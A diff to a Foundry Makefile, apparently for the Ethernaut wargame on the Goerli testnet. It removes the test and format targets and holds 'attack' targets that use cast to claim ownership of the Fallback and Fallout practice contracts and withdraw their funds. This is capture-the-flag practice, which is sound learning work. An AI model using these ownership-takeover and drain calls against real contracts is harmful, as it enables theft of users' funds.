@@ -1,6 +1,6 @@
 -include .env
 
-.PHONY: all test clean deploy fund help install snapshot format 
+.PHONY: all clean remove install update build attack-fallback attack-fallout
 
 help:
 	@echo "Usage:"
@@ -21,11 +21,8 @@ update:; forge update
 
 build:; forge build
 
-test :; forge test 
-
-snapshot :; forge snapshot
-
-format :; forge fmt
-
 attack-fallback :
 	@cast send $(FALLBACK_CONTRACT_ADDRESS) "contribute()" --value 0.0001ether --rpc-url $(GOERLI_RPC_URL) --private-key $(GOERLI_PRIVATE_KEY) && cast send $(FALLBACK_CONTRACT_ADDRESS) --value 0.0001ether --rpc-url $(GOERLI_RPC_URL) --private-key $(GOERLI_PRIVATE_KEY) && cast send $(FALLBACK_CONTRACT_ADDRESS) "withdraw()" --rpc-url $(GOERLI_RPC_URL) --private-key $(GOERLI_PRIVATE_KEY)
+
+attack-fallout :
+	@cast send $(FALLOUT_CONTRACT_ADDRESS) "Fal1out()" --rpc-url $(GOERLI_RPC_URL) --private-key $(GOERLI_PRIVATE_KEY)
